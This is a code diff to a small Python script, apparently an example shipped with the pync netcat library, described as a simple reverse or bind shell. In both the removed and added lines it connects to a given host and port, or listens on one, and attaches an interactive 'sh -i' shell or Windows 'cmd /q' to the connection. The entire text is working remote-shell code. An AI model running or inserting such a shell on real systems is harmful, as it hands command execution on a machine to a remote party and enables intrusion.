@@ -6,7 +6,7 @@ A simple reverse or bind shell using pync.
 import argparse
 import platform
 
-import pync
+from pync import Netcat
 
 
 def main():
@@ -14,9 +14,9 @@ def main():
             formatter_class=argparse.RawTextHelpFormatter,
             description=__doc__,
     )
-    parser.add_argument('host',
+    parser.add_argument('dest',
             help='Hostname or IP to connect to',
-            metavar='HOST',
+            metavar='DEST',
             nargs='?',
             default='',
     )
@@ -25,23 +25,26 @@ def main():
             metavar='PORT',
             type=int,
     )
-    parser.add_argument('--listen', '-l',
-            help='Listen mode, for inbound connects',
+    parser.add_argument('-l',
+            help='Listen mode, for bind shell',
             action='store_true',
     )
     args = parser.parse_args()
 
+    command = "PS1='$ ' sh -i"
     if platform.system() == 'Windows':
         command = 'cmd /q'
-    else:
-        command = "PS1='$ ' sh -i"
 
-    mode = pync.connect
-    if args.listen:
-        mode = pync.listen
+    nc = Netcat(args.port,
+            dest=args.dest,
+            e=command,
+            l=args.l,
+    )
 
-    with mode(args.host, args.port) as conn:
-        conn.execute(command)
+    try:
+        nc.run()
+    finally:
+        nc.close()
 
 
 if __name__ == '__main__':
